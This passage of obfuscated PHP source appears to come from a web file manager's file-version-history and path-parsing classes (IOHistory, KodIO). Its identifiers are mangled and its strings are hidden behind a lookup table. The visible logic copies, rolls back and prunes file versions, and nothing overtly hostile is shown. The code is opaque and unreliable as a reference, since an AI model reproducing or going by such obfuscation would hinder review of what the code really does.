= self::pathHistory($ôñ); if ($ó•Ö³Ç³¦µ[$ßÜ“Ã…”[29]] == $ßÜ“Ã…”[193]) { $™—³¸óøšõ = self::listData($îÓç€ìú½€ëĞ); $Èø = rtrim($ôñ, $ßÜ“Ã…”[8]) . $ßÜ“Ã…”[8] . ($Ø© ? $Ø© : get_path_this($îÓç€ìú½€ëĞ)); $Îåõ™ÂÍÜøğ» = self::listData($Èø); if ($™—³¸óøšõ && $™—³¸óøšõ[$ßÜ“Ã…”[367]] && $Îåõ™ÂÍÜøğ» && $Îåõ™ÂÍÜøğ»[$ßÜ“Ã…”[367]]) { return self::clear($îÓç€ìú½€ëĞ); } if ($™—³¸óøšõ && $™—³¸óøšõ[$ßÜ“Ã…”[367]]) { self::moveHistory($îÓç€ìú½€ëĞ, $Ø©, $„ùŒ§éœ·); } } else { IO::move($ó•Ö³Ç³¦µ[$ßÜ“Ã…”[76]], $„ùŒ§éœ·, !1, $Ø©); self::clearEmptyFolder(IO::pathFather($ó•Ö³Ç³¦µ[$ßÜ“Ã…”[76]])); } } public static function eventAfterRemove($œÙõˆæÉ, $ŠûóÅ) { $˜› =& $_SERVER[èÍ×öˆøÉ]; if (!$ŠûóÅ) { return; } $¼Ğìğ‹›Ô = self::parsePath($œÙõˆæÉ[0]); if (!$¼Ğìğ‹›Ô) { return; } $¥³Ó˜ÉÍ¢å = self::checkInHistory($¼Ğìğ‹›Ô); if (!$¥³Ó˜ÉÍ¢å) { return; } if ($¥³Ó˜ÉÍ¢å[$˜›[29]] == $˜›[193]) { $¨È²Óï¢Œ‚„ = self::listData($¼Ğìğ‹›Ô, !1); if ($¨È²Óï¢Œ‚„ && $¨È²Óï¢Œ‚„[$˜›[367]]) { self::clear($¼Ğìğ‹›Ô, !1); } } else { IO::remove($¥³Ó˜ÉÍ¢å[$˜›[76]]); self::clearEmptyFolder(IO::pathFather($¥³Ó˜ÉÍ¢å[$˜›[76]])); } } private static function checkInHistory($“Â) { $ÆÌƒ = self::pathHistory($“Â); if (!IO::exist($ÆÌƒ)) { $ÆÌƒ .= $_SERVER[èÍ×öˆøÉ][1156]; } return IO::exist($ÆÌƒ) ? IO::info($ÆÌƒ) : !1; } private static function parsePath($Ø©»ÑŞ»ª) { $¤ï =& $_SERVER[èÍ×öˆøÉ]; if (!$Ø©»ÑŞ»ª) { return !1; } if ($GLOBALS[$¤ï[1157]]) { return; } $Œ¿Ÿ”ãé† = KodIO::parse($Ø©»ÑŞ»ª); $†ÈİÚÄÌ§Æšä = $Œ¿Ÿ”ãé†[$¤ï[29]]; $Å…‡æêú” = !$†ÈİÚÄÌ§Æšä || $†ÈİÚÄÌ§Æšä == KodIO::KOD_IO || $†ÈİÚÄÌ§Æšä == KodIO::KOD_SHARE_ITEM; if (!$Å…‡æêú” || !$Œ¿Ÿ”ãé†[$¤ï[1158]]) { return !1; } if (substr($Ø©»ÑŞ»ª, 0, strlen(DATA_PATH . $¤ï[1159])) == DATA_PATH . $¤ï[1159]) { return !1; } if ($†ÈİÚÄÌ§Æšä == KodIO::KOD_SHARE_ITEM) { $»’í = IO::init($Ø©»ÑŞ»ª); if ($»’í->pathParse[$¤ï[1086]]) { return self::parsePath($»’í->pathParse[$¤ï[1086]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ô«Ûà” = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¤ï[1160]); foreach ($Ô«Ûà” as $ÆƒÀ¶Ô¦µ¬©ì) { if (!$†ÈİÚÄÌ§Æšä && substr($Ø©»ÑŞ»ª, 0, strlen($ÆƒÀ¶Ô¦µ¬©ì)) == $ÆƒÀ¶Ô¦µ¬©ì) { return !1; } } self::log($GLOBALS[$¤ï[1081]] . $¤ï[1161] . $Ø©»ÑŞ»ª); return $Ø©»ÑŞ»ª; } private static function pathHistory($Œä¸áîÒŸŠá) { $ÎÛŠù =& $_SERVER[èÍ×öˆøÉ]; $ôÖÙÑ = self::$_historyBase . ltrim(KodIO::clear($Œä¸áîÒŸŠá), $ÎÛŠù[8]); $ôÖÙÑ = str_replace(array($ÎÛŠù[1162]), array($ÎÛŠù[1163]), $ôÖÙÑ); return $ôÖÙÑ; } public static function log($‡Ğœ) { } public static function historyCount($”ò»Ş É) { $¿„ŠšøÓì =& $_SERVER[èÍ×öˆøÉ]; $“÷ù÷ø = array(); $‹Ò = array(); foreach ($”ò»Ş É as $¥È’›†ô‹¯Ü) { $öÕ” = get_path_father($¥È’›†ô‹¯Ü); if (!$‹Ò[$öÕ”]) { $‹Ò[$öÕ”] = array(); } $‹Ò[$öÕ”][] = get_path_this($¥È’›†ô‹¯Ü); } foreach ($‹Ò as $öÕ” => $ç®¨¥) { $ñ ô‚¨ = self::parsePath($öÕ”); if (!$ñ ô‚¨) { continue; } foreach ($ç®¨¥ as $ã¡é¸—) { $ãõŞÃÇÍü€Õæ = self::listData(rtrim($ñ ô‚¨, $¿„ŠšøÓì[8]) . $¿„ŠšøÓì[8] . $ã¡é¸—, !1); if ($ãõŞÃÇÍü€Õæ && $ãõŞÃÇÍü€Õæ[$¿„ŠšøÓì[367]]) { $“÷ù÷ø[rtrim($öÕ”, $¿„ŠšøÓì[8]) . $¿„ŠšøÓì[8] . $ã¡é¸—] = count($ãõŞÃÇÍü€Õæ[$¿„ŠšøÓì[367]]); } } } return $“÷ù÷ø; } public static function add($¬˜´Ÿ) { $¼²¿îì³õş =& $_SERVER[èÍ×öˆøÉ]; $±Æ¼Ë¨øÃ¹Ô = self::listData($¬˜´Ÿ); if (!$±Æ¼Ë¨øÃ¹Ô) { return; } $û—¿± = Model($¼²¿îì³õş[765])->get($¼²¿îì³õş[1164]); $åƒ¿ğ™ªµ¼†± = $GLOBALS[$¼²¿îì³õş[6]][$¼²¿îì³õş[88]][$¼²¿îì³õş[1142]]; $Ğ£·¦ôí“Ò = $û—¿± == $¼²¿îì³õş[1165] ? 5 : $åƒ¿ğ™ªµ¼†±; if ($åƒ¿ğ™ªµ¼†± <= 0) { return; } $ªŸËªäñƒ‰· = IO::hashSimple($¬˜´Ÿ); $–çÎ±å = IO::info($¬˜´Ÿ); $±·´Ä®°à = $±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[367]]; if ($–çÎ±å[$¼²¿îì³õş[78]] == 0) { return; } if ($–çÎ±å[$¼²¿îì³õş[78]] >= 1024 * 1024 * 500) { return !1; } if ($±·´Ä®°à && $±·´Ä®°à[0][$¼²¿îì³õş[171]] == $ªŸËªäñƒ‰·) { return !0; } if (array_key_exists($¼²¿îì³õş[196], $–çÎ±å) && !$–çÎ±å[$¼²¿îì³õş[196]]) { return !1; } $Ûáå… = short_id(time()); $’í = array($¼²¿îì³õş[395] => $Ûáå…, $¼²¿îì³õş[171] => $ªŸËªäñƒ‰·, $¼²¿îì³õş[28] => $–çÎ±å[$¼²¿îì³õş[28]] . $¼²¿îì³õş[95] . date($¼²¿îì³õş[1166]) . rand_string(1), $¼²¿îì³õş[78] => $–çÎ±å[$¼²¿îì³õş[78]], $¼²¿îì³õş[446] => USER_ID, $¼²¿îì³õş[194] => time(), $¼²¿îì³õş[1167] => $¼²¿îì³õş[33]); IO::mkdir($±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[1168]]); $ÄÄÃóª = IO::copy($¬˜´Ÿ, $±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[1168]], !1, $’í[$¼²¿îì³õş[28]]); if (!$ÄÄÃóª) { self::clearEmptyFolder($±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[1168]]); return !1; } array_unshift($±·´Ä®°à, $’í); if (count($±·´Ä®°à) > $Ğ£·¦ôí“Ò) { $—€Ê² = array_slice($±·´Ä®°à, $Ğ£·¦ôí“Ò); foreach ($—€Ê² as $êışçş) { IO::remove($±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[1168]] . $êışçş[$¼²¿îì³õş[28]]); } $±·´Ä®°à = array_slice($±·´Ä®°à, 0, $Ğ£·¦ôí“Ò); } return self::saveData($±Æ¼Ë¨øÃ¹Ô[$¼²¿îì³õş[1169]], $±·´Ä®°à); } public static function remove($‰, $™ä©ö) { $İğ’Öêóëû³Í =& $_SERVER[èÍ×öˆøÉ]; $è¼çÛ÷ø = self::listData($‰); $®Èï¿ııØ•Á = array(); if (!$è¼çÛ÷ø) { return !1; } foreach ($è¼çÛ÷ø[$İğ’Öêóëû³Í[367]] as $×ù‚’õı›œ) { if ($×ù‚’õı›œ[$İğ’Öêóëû³Í[395]] == $™ä©ö) { IO::remove($è¼çÛ÷ø[$İğ’Öêóëû³Í[1168]] . $×ù‚’õı›œ[$İğ’Öêóëû³Í[28]]); continue; } $®Èï¿ııØ•Á[] = $×ù‚’õı›œ; } return self::saveData($è¼çÛ÷ø[$İğ’Öêóëû³Í[1169]], $®Èï¿ııØ•Á); } public static function clear($±‹ôĞû×, $ó£à òú¦­ = true) { $œÊÏ¾É =& $_SERVER[èÍ×öˆøÉ]; $á¢ = self::listData($±‹ôĞû×, $ó£à òú¦­); if (!$á¢) { return !1; } foreach ($á¢[$œÊÏ¾É[367]] as $ÎàÙ§Äî»ùÙ¯) { IO::remove($á¢[$œÊÏ¾É[1168]] . $ÎàÙ§Äî»ùÙ¯[$œÊÏ¾É[28]]); } return self::saveData($á¢[$œÊÏ¾É[1169]], array()); } public static function moveHistory($ˆı³Üìè†, $¤³ğ¿óÉå = '', $­€òú¾£±Ú = '') { $¡êºõÕÎğÃàµ =& $_SERVER[èÍ×öˆøÉ]; $ˆü‰€•‡ãŞ = self::listData($ˆı³Üìè†, !1); if (!$ˆü‰€•‡ãŞ || !$ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[367]]) { return !1; } $¹« = $¡êºõÕÎğÃàµ[1156]; $¤³ğ¿óÉå = $¤³ğ¿óÉå ? $¤³ğ¿óÉå : get_path_this($ˆı³Üìè†); $­€òú¾£±Ú = $­€òú¾£±Ú ? $­€òú¾£±Ú : $ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1168]]; $’‚¤ÖÂ¡Ü = substr(get_path_this($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1169]]), 0, -strlen($¹«)); foreach ($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[367]] as $’×½ä => $â¿³ğÍòç¤ã–) { $ÂŠ¨›¯Î‰ = $¤³ğ¿óÉå . substr($â¿³ğÍòç¤ã–[$¡êºõÕÎğÃàµ[28]], strlen($’‚¤ÖÂ¡Ü)); $Àå¡ÚÒ©˜ = IO::move($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1168]] . $â¿³ğÍòç¤ã–[$¡êºõÕÎğÃàµ[28]], $­€òú¾£±Ú, !1, $ÂŠ¨›¯Î‰); if ($Àå¡ÚÒ©˜) { $ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[367]][$’×½ä][$¡êºõÕÎğÃàµ[28]] = $ÂŠ¨›¯Î‰; } } $ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1169]] = IO::move($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1169]], $­€òú¾£±Ú, !1, $¤³ğ¿óÉå . $¹«); self::saveData($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1169]], $ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[367]]); self::clearEmptyFolder($ˆü‰€•‡ãŞ[$¡êºõÕÎğÃàµ[1168]]); } public static function rollback($Æû, $ß¢Ù¥êº„) { $ÉÆğƒãœú«õ¸ =& $_SERVER[èÍ×öˆøÉ]; $¥´ = self::listData($Æû); if (!$¥´) { return; } $·Ø¿Ÿ«« = IO::info($Æû); foreach ($¥´[$ÉÆğƒãœú«õ¸[367]] as $ˆ¬¶¦‡ => $Şıûûı) { if ($Şıûûı[$ÉÆğƒãœú«õ¸[395]] == $ß¢Ù¥êº„) { self::add($Æû); $‘Ó¬ = $¥´[$ÉÆğƒãœú«õ¸[1168]] . $Şıûûı[$ÉÆğƒãœú«õ¸[28]]; $óè’Â…Ç‰Õ = IO::copy($‘Ó¬, IO::pathFather($Æû), REPEAT_REPLACE, $·Ø¿Ÿ««[$ÉÆğƒãœú«õ¸[28]]); if ($óè’Â…Ç‰Õ) { self::remove($Æû, $ß¢Ù¥êº„); } return $óè’Â…Ç‰Õ; } } return !1; } public static function setDetail($ÁÕ, $¹¹ù, $İîïÌì) { $× =& $_SERVER[èÍ×öˆøÉ]; $ºëáÙ = self::listData($ÁÕ); if (!$ºëáÙ) { return; } foreach ($ºëáÙ[$×[367]] as $É¦ù©š => $èöÃÏøš) { if ($èöÃÏøš[$×[395]] == $¹¹ù) { $ºëáÙ[$×[367]][$É¦ù©š][$×[1167]] = $İîïÌì; self::saveData($ºëáÙ[$×[1169]], $ºëáÙ[$×[367]]); return !0; } } return !1; } public static function fileInfo($ìâó¨, $óÃ¯×Ü) { $ä¹Ÿİöğ¹ÂùÕ =& $_SERVER[èÍ×öˆøÉ]; $û¯Š = self::listData($ìâó¨); if (!$û¯Š) { show_json(LNG($ä¹Ÿİöğ¹ÂùÕ[105]), !1); } $‰¡” = $ä¹Ÿİöğ¹ÂùÕ[33]; foreach ($û¯Š[$ä¹Ÿİöğ¹ÂùÕ[367]] as $³¢ÙÔ¼¬¹ => $‘†Íùûş) { if ($‘†Íùûş[$ä¹Ÿİöğ¹ÂùÕ[395]] != $óÃ¯×Ü) { continue; } $‰¡” = $û¯Š[$ä¹Ÿİöğ¹ÂùÕ[1168]] . $‘†Íùûş[$ä¹Ÿİöğ¹ÂùÕ[28]]; break; } if (!$‰¡”) { show_json(LNG($ä¹Ÿİöğ¹ÂùÕ[105]), !1); } return IO::info($‰¡”); } public static function fileOut($ò‚å Šó†ìÑ›, $ßË‚÷, $å—ÜƒôÃŞØÖÎ = false) { $Îò˜˜İ =& $_SERVER[èÍ×öˆøÉ]; $ğŒ—Ôúœ×Ã = self::fileInfo($ò‚å Šó†ìÑ›, $ßË‚÷); $Šíº°Ï¿• =& $GLOBALS[$Îò˜˜İ[7]]; $å—ÜƒôÃŞØÖÎ = isset($Šíº°Ï¿•[$Îò˜˜İ[1132]]) && $Šíº°Ï¿•[$Îò˜˜İ[1132]] == 1; if (isset($Šíº°Ï¿•[$Îò˜˜İ[29]]) && $Šíº°Ï¿•[$Îò˜˜İ[29]] == $Îò˜˜İ[1170]) { return IO::fileOutImage($ğŒ—Ôúœ×Ã[$Îò˜˜İ[76]], $Šíº°Ï¿•[$Îò˜˜İ[1171]]); } IO::fileOut($ğŒ—Ôúœ×Ã[$Îò˜˜İ[76]], $å—ÜƒôÃŞØÖÎ, get_path_this($ò‚å Šó†ìÑ›)); } public static function listData($ì—Ì•, $õ¿ûÅ’œôœÇş = true) { $Í¿´¡ =& $_SERVER[èÍ×öˆøÉ]; if ($õ¿ûÅ’œôœÇş && !IO::exist($ì—Ì•)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ì—Ì•, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¢ÓşåŠÒ›Å = self::pathHistory($ì—Ì•); $·Ëı¸ = array($Í¿´¡[1169] => $¢ÓşåŠÒ›Å . $Í¿´¡[1156], $Í¿´¡[1168] => rtrim(get_path_father($¢ÓşåŠÒ›Å), $Í¿´¡[8]) . $Í¿´¡[8], $Í¿´¡[367] => array()); $®‘ = IO::getContent($·Ëı¸[$Í¿´¡[1169]]); if ($®‘) { $à­ = json_decode($®‘, !0); if (is_array($à­)) { $·Ëı¸[$Í¿´¡[367]] = $à­; } } return $·Ëı¸; } private static function saveData($âÃÓ´, $Šİû¦¼º) { $à¥·åŸ¶“ =& $_SERVER[èÍ×öˆøÉ]; self::log($à¥·åŸ¶“[1172] . $âÃÓ´ . $à¥·åŸ¶“[68] . count($Šİû¦¼º), $à¥·åŸ¶“[747]); if ($Šİû¦¼º) { return IO::setContent($âÃÓ´, json_encode($Šİû¦¼º)); } $¨à = IO::pathFather($âÃÓ´); IO::remove($âÃÓ´); self::clearEmptyFolder($¨à); return !0; } public static function clearEmptyFolder($Ü‰) { $ŠÃ =& $_SERVER[èÍ×öˆøÉ]; if (trim($Ü‰, $ŠÃ[8]) == trim(self::$_historyBase, $ŠÃ[8])) { return; } $’æéáÉ©  = IO::pathFather($Ü‰); $Ûùõ« = IO::has($Ü‰, !0); if ($Ûùõ«[$ŠÃ[203]] > 0 || $Ûùõ«[$ŠÃ[204]] > 0) { return; } IO::remove($Ü‰); self::clearEmptyFolder($’æéáÉ© ); } private static function getBasePath() { $¦ïÁµ =& $_SERVER[èÍ×öˆøÉ]; $è’”‹° = Model($¦ïÁµ[1173])->get($¦ïÁµ[1174]); if ($è’”‹°) { if (!IO::exist($è’”‹°)) { IO::mkdir($è’”‹°); } if (get_path_this($è’”‹°) == $¦ïÁµ[1159]) { $Éšø€˜ªü = $¦ïÁµ[1175] . rand_string(8); @rename($è’”‹°, get_path_father($è’”‹°) . $¦ïÁµ[8] . $Éšø€˜ªü); $è’”‹° = DATA_PATH . $Éšø€˜ªü . $¦ïÁµ[8]; file_put_contents(DATA_PATH . $¦ïÁµ[1176], $¦ïÁµ[33]); Model($¦ïÁµ[1173])->set($¦ïÁµ[1174], $è’”‹°); } return $è’”‹°; } $è’”‹° = DATA_PATH . $¦ïÁµ[1175] . rand_string(8) . $¦ïÁµ[8]; $è’”‹° = IO::mkdir($è’”‹°); $è’”‹° = rtrim($è’”‹°, $¦ïÁµ[8]) . $¦ïÁµ[8]; file_put_contents($è’”‹° . $¦ïÁµ[1176], $¦ïÁµ[33]); file_put_contents(DATA_PATH . $¦ïÁµ[1176], $¦ïÁµ[33]); Model($¦ïÁµ[1173])->set($¦ïÁµ[1174], $è’”‹°); return $è’”‹°; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\122\x65\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\106\x69\154\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\x46\151\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\x70\x52\157\x6f\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\123\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\162\x53\x68\141\x72\x65\114\x69\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\x65\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\x65\x49\x74\x65\155\x4c\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\162\x63\x68\175"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\x65\x6e\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\145\x72\175"; public static function typeList() { $íÊ»¶ÒŞâŸÑ =& $_SERVER[èÍ×öˆøÉ]; return array($íÊ»¶ÒŞâŸÑ[1177] => self::KOD_SOURCE, $íÊ»¶ÒŞâŸÑ[1178] => self::KOD_USER_RECYCLE, $íÊ»¶ÒŞâŸÑ[1179] => self::KOD_USER_FAV, $íÊ»¶ÒŞâŸÑ[1180] => self::KOD_USER_FILE_TAG, $íÊ»¶ÒŞâŸÑ[1181] => self::KOD_USER_FILE_TYPE, $íÊ»¶ÒŞâŸÑ[1182] => self::KOD_GROUP_ROOT_SELF, $íÊ»¶ÒŞâŸÑ[1183] => self::KOD_USER_SHARE, $íÊ»¶ÒŞâŸÑ[1184] => self::KOD_USER_SHARE_LINK, $íÊ»¶ÒŞâŸÑ[1185] => self::KOD_USER_SHARE_TO_ME, $íÊ»¶ÒŞâŸÑ[1186] => self::KOD_SHARE_ITEM, $íÊ»¶ÒŞâŸÑ[1187] => self::KOD_SHARE_LINK, $íÊ»¶ÒŞâŸÑ[1188] => self::KOD_SEARCH, $íÊ»¶ÒŞâŸÑ[1189] => self::KOD_BLOCK, $íÊ»¶ÒŞâŸÑ[1190] => self::KOD_IO, $íÊ»¶ÒŞâŸÑ[1191] => self::KOD_USER_RECENT, $íÊ»¶ÒŞâŸÑ[1192] => self::KOD_USER_DRIVER); } public static function parse($Úñ¥«¨ŞìÕ) { $ïÁë¥ =& $_SERVER[èÍ×öˆøÉ]; $Úñ¥«¨ŞìÕ = self::clear($Úñ¥«¨ŞìÕ); $ä²‡ú­ªÏ = array_values(self::typeList()); preg_match($ïÁë¥[1193], $Úñ¥«¨ŞìÕ, $èó°®ì); $Ïâ»´è’ƒı = array($ïÁë¥[417] => !1, $ïÁë¥[1194] => !1, $ïÁë¥[414] => !1, $ïÁë¥[76] => $Úñ¥«¨ŞìÕ, $ïÁë¥[1103] => !1, $ïÁë¥[1102] => $ïÁë¥[33]); if (is_array($èó°®ì) && count($èó°®ì) == 5) { $â–¡Â = $ïÁë¥[1195] . $èó°®ì[2] . $ïÁë¥[325]; if (in_array($â–¡Â, $ä²‡ú­ªÏ)) { $Ïâ»´è’ƒı[$ïÁë¥[1103]] = $èó°®ì[1]; $Ïâ»´è’ƒı[$ïÁë¥[29]] = $â–¡Â; $Ïâ»´è’ƒı[$ïÁë¥[1196]] = substr($â–¡Â, 1, -1); $Ïâ»´è’ƒı[$ïÁë¥[395]] = $èó°®ì[3]; } $Ïâ»´è’ƒı[$ïÁë¥[1102]] = $èó°®ì[4]; } $å©“† = array($ïÁë¥[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $Ïâ»´è’ƒı[$ïÁë¥[1158]] = in_array($Ïâ»´è’ƒı[$ïÁë¥[29]], $å©“†); return $Ïâ»´è’ƒı; } public static function isTruePath($óœ„) { $ÕœçÎ =& $_SERVER[èÍ×öˆøÉ]; if (substr($óœ„, 0, 1) != $ÕœçÎ[1195]) { return !0; } if (strpos($óœ„, $ÕœçÎ[403]) === 0) { return !0; } if (strpos($óœ„, $ÕœçÎ[1162]) === 0) { return !0; } if (strpos($óœ„, $ÕœçÎ[1197]) === 0) { return !0; } if (strpos($óœ„, $ÕœçÎ[1198]) === 0) { return !0; } if (strpos($óœ„, $ÕœçÎ[1199]) === 0) { return !0; } return !1; } public static function clear($ĞŠ) { $ş¾íßÈ =& $_SERVER[èÍ×öˆøÉ]; $ĞŠ = str_replace(array($ş¾íßÈ[1076], $ş¾íßÈ[229]), $ş¾íßÈ[50], $ĞŠ); $ĞŠ = str_replace($ş¾íßÈ[97], $ş¾íßÈ[8], $ĞŠ); $›Òè¦í¨Æü = $ş¾íßÈ[1200]; if (substr($ĞŠ, 0, 3) == $ş¾íßÈ[1201]) { $ĞŠ = substr($ĞŠ, 3); } while (strstr($ĞŠ, $›Òè¦í¨Æü)) { $ĞŠ = str_replace($›Òè¦í¨Æü, $ş¾íßÈ[8], $ĞŠ); } $ĞŠ = preg_replace($ş¾íßÈ[1202], $ş¾íßÈ[8], $ĞŠ); if ($ĞŠ == $ş¾íßÈ[8]) { return $ş¾íßÈ[8]; } $ĞŠ = rtrim($ĞŠ, $ş¾íßÈ[8]); return $ĞŠ; } public static function sourceID($ÚàŞ¼¶ÕÅÌõ) { $Ø„Âó =& $_SERVER[èÍ×öˆøÉ]; $¿—Ãş = self::parse($ÚàŞ¼¶ÕÅÌõ); if ($¿—Ãş[$Ø„Âó[29]] !== self::KOD_SOURCE) { show_json(LNG($Ø„Âó[1203]), !1); } return $¿—Ãş[$Ø„Âó[395]]; } public static function make($Şƒ•) { if (!$Şƒ•) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Şƒ•)); } public static function makeShare($à÷¢ä»Ò , $ıÌä‘Ÿ¦) { return self::makePath(self::KOD_SHARE_ITEM, $à÷¢ä»Ò , $ıÌä‘Ÿ¦); } public static function makeFileTypePath($÷Ù™¥ıû) { return self::makePath(self::KOD_USER_FILE_TYPE, $÷Ù™¥ıû); } public static function makeFileTagPath($¢’Ë¶¼—¾¦¨) { return self::makePath(self::KOD_USER_FILE_TAG, $¢’Ë¶¼—¾¦¨); } public static function makePath($¿¸–Á‹ÙöÃ, $€´¹ó = '', $Ÿ’ = '') { $œÎÊ‹» =& $_SERVER[èÍ×öˆøÉ]; $»¶ìûÒè = substr($¿¸–Á‹ÙöÃ, 1, -1); $„í = $œÎÊ‹»[1204] . $»¶ìûÒè . $œÎÊ‹»[1205] . $€´¹ó . $œÎÊ‹»[1206]; $„í = $Ÿ’ ? $„í . $Ÿ’ . $œÎÊ‹»[8] : $„í; return $„í; } public static function hashPath($ç©‚Èı¶€, $İ£Ê­ = true) { $‹Ğğƒ¸¶è =& $_SERVER[èÍ×öˆøÉ]; $äæ©Éİ² = is_array($ç©‚Èı¶€) ? $ç©‚Èı¶€ : IO::info($ç©‚Èı¶€); $¿å = _get($äæ©Éİ², $‹Ğğƒ¸¶è[1207], $‹Ğğƒ¸¶è[33]); if (!$¿å && isset($äæ©Éİ²[$‹Ğğƒ¸¶è[397]])) { $äæ©Éİ² = IO::info(KodIO::make($äæ©Éİ²[$‹Ğğƒ¸¶è[397]])); $¿å = _get($äæ©Éİ², $‹Ğğƒ¸¶è[1207], $‹Ğğƒ¸¶è[33]); } if (!$¿å && $İ£Ê­) { $²¬î²Ó’¬ˆ = KodIO::parse($äæ©Éİ²[$‹Ğğƒ¸¶è[76]]); if (!$²¬î²Ó’¬ˆ[$‹Ğğƒ¸¶è[29]]) { $¿å = IO::hashSimple($äæ©Éİ²[$‹Ğğƒ¸¶è[76]]); } } if (!$¿å) { $¿å = md5($äæ©Éİ²[$‹Ğğƒ¸¶è[76]] . $äæ©Éİ²[$‹Ğğƒ¸¶è[78]] . $äæ©Éİ²[$‹Ğğƒ¸¶è[84]]); } return $¿å; } public static function initSystemPath() { $°‡µéÓ·ÎùÇá =& $_SERVER[èÍ×öˆøÉ]; if (defined($°‡µéÓ·ÎùÇá[1208])) { return; } define($°‡µéÓ·ÎùÇá[1208], self::systemPath($°‡µéÓ·ÎùÇá[1209])); define($°‡µéÓ·ÎùÇá[1210], self::systemPath($°‡µéÓ·ÎùÇá[1211])); define($°‡µéÓ·ÎùÇá[1212], self::systemPath($°‡µéÓ·ÎùÇá[1213])); define($°‡µéÓ·ÎùÇá[1214], self::systemPath($°‡µéÓ·ÎùÇá[1215])); IOHistory::bindEvent(); } public static function systemPath($Çã²ğ¾»ÇÄ¨) { $¸¦ùÃ =& $_SERVER[èÍ×öˆøÉ]; $´ËûÑ = $¸¦ùÃ[1216] . ucfirst($Çã²ğ¾»ÇÄ¨); $è¹´è‡¶â˜æÃ = Model($¸¦ùÃ[765])->get($´ËûÑ); if ($è¹´è‡¶â˜æÃ) { return $è¹´è‡¶â˜æÃ; } if ($Çã²ğ¾»ÇÄ¨ == $¸¦ùÃ[1209]) { $è¹´è‡¶â˜æÃ = self::make(Model($¸¦ùÃ[827])->systemRootPathAdd($¸¦ùÃ[531])); } else { $è¹´è‡¶â˜æÃ = self::systemPath($¸¦ùÃ[1209]); $´û†½”êù = self::sourceID($è¹´è‡¶â˜æÃ); $è¹´è‡¶â˜æÃ = self::make(Model($¸¦ùÃ[827])->mkdir($´û†½”êù, $Çã²ğ¾»ÇÄ¨)); } Model($¸¦ùÃ[765])->set($´ËûÑ, $è¹´è‡¶â˜æÃ); return $è¹´è‡¶â˜æÃ; } public static function systemFolder($ÖøªçÌÆ) { $Öû–Ùê¢ºÇ = IO_PATH_SYSTEM_SOURCE . $ÖøªçÌÆ; $ÄÕÊú™õ = Cache::get($Öû–Ùê¢ºÇ); if (!$ÄÕÊú™õ) { $ÁŠû»˜¸›£ = IO::infoFull($Öû–Ùê¢ºÇ); if (!$ÁŠû»˜¸›£) { $ÄÕÊú™õ = IO::mkdir($Öû–Ùê¢ºÇ, REPEAT_SKIP); } else { $ÄÕÊú™õ = $ÁŠû»˜¸›£[$_SERVER[èÍ×öˆøÉ][76]]; } Cache::set($Öû–Ùê¢ºÇ, $ÄÕÊú™õ, 3600 * 10); } return $ÄÕÊú™õ; } public static function defaultDriver() { return Model($_SERVER[èÍ×öˆøÉ][762])->defaultDriver(); } public static function defaultIO() { $ëï® =& $_SERVER[èÍ×öˆøÉ]; $¸À = self::defaultDriver(); return $ëï®[1217] . $¸À[$ëï®[395]] . $ëï®[1206]; } public static function defaultDriverInit() { static $çÂ = false; if ($çÂ) { return $çÂ; } $çÂ = IO::init(self::defaultIO()); return $çÂ; } public static function fileTypeList() { $»‰í¿©–ª€×– =& $_SERVER[èÍ×öˆøÉ]; $ˆÙ = $GLOBALS[$»‰í¿©–ª€×–[6]][$»‰í¿©–ª€×–[1218]]; foreach ($ˆÙ as $¼İñ¢à => $Ë¯¥«õå ¯³) { $â‹ıùŞèÆ = $»‰í¿©–ª€×–[1219] . $¼İñ¢à; $÷Å‡ = LNG($â‹ıùŞèÆ); if ($â‹ıùŞèÆ != $÷Å‡) { $ˆÙ[$¼İñ¢à][$»‰í¿©–ª€×–[28]] = $÷Å‡; } } return $ˆÙ; } public static function diskList($ú²çÈé = true) { $€Ë = $_SERVER[èÍ×öˆøÉ][1220]; if ($ú²çÈé) { $›§ = Cache::get($€Ë); if (is_array($›§)) { return $›§; } } $›§ = self::diskListGet(); Cache::set($€Ë, $›§, 3600); return $›§; 